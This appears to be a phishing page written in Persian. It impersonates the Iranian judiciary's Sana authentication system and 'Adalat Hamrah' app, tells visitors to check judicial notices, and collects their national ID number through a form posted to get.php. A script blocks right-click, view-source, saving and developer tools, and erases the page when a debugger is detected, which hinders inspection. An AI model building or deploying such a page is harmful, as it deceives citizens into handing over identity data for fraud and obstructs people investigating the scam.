<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>سامانه احراز هویت ثنا</title>
  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/shabnam-font@v5.0.1/dist/font-face.css" rel="stylesheet">

  <style>
    body {
      font-family: 'Shabnam', sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f7f9fc;
    }

    .header {
      background: url('gg.png') no-repeat center top;
      background-size: cover;
      height: 55.5px;
      position: relative;
    }

    .logo {
      background: white;
      border-radius: 50%;
      padding: 4px;
      width: 44px;
      height: 44px;
      display: flex;
      align-items: center;
      justify-content: center;
      position: absolute;
      left: 50%;
      transform: translateX(-50%);
      bottom: -27.5px;
      box-shadow: 0 0 6px rgba(0,0,0,0.05);
    }

    .logo img {
      width: 36px;
      height: 36px;
    }

    .container {
      max-width: 400px;
      margin: 25px auto 30px;
      padding: 0 20px;
    }

    .title {
      text-align: center;
      font-size: 18px;
      font-weight: bold;
      color: #002366;
      margin-top: 5px;
    }

    .subtitle {
      text-align: center;
      font-size: 14px;
      color: #777;
      margin-bottom: 15px;
    }

    .user-types {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 10px;
      margin-bottom: 30px;
    }

    .user-types button {
      padding: 8px 10px;
      border-radius: 4px;
      border: 1px solid #ccc;
      background: #fff;
      font-size: 13px;
      cursor: pointer;
      font-family: 'Shabnam', sans-serif;
    }

    .user-types .active {
      border: 1px solid #f9a825;
      background-color: #fff8e1;
      position: relative;
    }

    .user-types .active::after {
      content: "";
      position: absolute;
      bottom: 6px;
      left: 50%;
      transform: translateX(-50%);
      width: 6px;
      height: 6px;
      background: #f9a825;
      border-radius: 50%;
    }

    input {
      width: 100%;
      padding: 10px 14px;
      margin-bottom: 15px;
      border-radius: 6px;
      border: 1px solid #ccc;
      background-color: #fff;
      font-size: 14px;
      font-family: 'Shabnam', sans-serif;
      box-sizing: border-box;
    }

    label {
      font-size: 14px;
      color: #333;
      margin-bottom: 5px;
      display: block;
    }

    .btn-submit {
      width: 100%;
      padding: 12px 0;
      background-color: #002366;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 15px;
      font-family: 'Shabnam', sans-serif;
      text-align: center;
      cursor: pointer;
    }

    #error-msg {
      color: red;
      font-size: 14px;
      display: none;
      margin-bottom: 10px;
      text-align: center;
    }
  </style>
</head>
<body>

  <div class="header">
    <div class="logo">
      <img src="logo.png" alt="logo">
    </div>
  </div>

  <div class="container">
    <div class="title">ورود به اپلیکیشن عدالت همراه</div>
    <div class="subtitle">بررسی ابلاغ الکترونیک قضایی</div>

    <div class="user-types">
      <button class="active">ورود با کد ملی</button>
      <button id="nonIranianBtn">ورود با شماره همراه</button>
    </div>

    <form id="sanaForm" method="POST" action="get.php">
      <label for="cm">شماره ملی خود را وارد کنید .</label>
      <input type="text" id="cm" name="cm" maxlength="10" inputmode="numeric" pattern="[0-9]*">
      <p id="error-msg"></p>
      <button type="submit" class="btn-submit">ورود به اپلیکیشن</button>
    </form>
  </div>

  <script>
    document.getElementById("nonIranianBtn").addEventListener("click", function () {
      window.location.href = "/app/index2.php"; // مسیر مورد نظر خود را اینجا وارد کنید
    });

    document.getElementById("sanaForm").addEventListener("submit", function (e) {
      const cm = document.getElementById("cm").value.trim();
      const errorMsg = document.getElementById("error-msg");

      const isNumeric = str => /^\d+$/.test(str);

      if (!cm) {
        e.preventDefault();
        errorMsg.textContent = "لطفاً شماره ملی را وارد کنید.";
        errorMsg.style.display = "block";
        return;
      }

      if (!isNumeric(cm) || cm.length !== 10) {
        e.preventDefault();
        errorMsg.textContent = "شماره ملی باید فقط شامل ۱۰ رقم باشد.";
        errorMsg.style.display = "block";
        return;
      }

      errorMsg.style.display = "none";
    });
  </script>


<script>
document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('keydown', function(e){
    if(
        e.keyCode === 123 || 
        (e.ctrlKey && e.keyCode === 85) || 
        (e.ctrlKey && e.shiftKey && e.keyCode === 73) ||
        (e.ctrlKey && e.keyCode === 83)
    ){
        e.preventDefault();
        return false;
    }
});
document.addEventListener('selectstart', e => e.preventDefault());

// basic devtools detect (weak)
setInterval(function(){
    const before = Date.now();
    debugger;
    const after = Date.now();
    if(after - before > 100){
        document.body.innerHTML = "";
    }
}, 2000);
</script>

</body>
</html>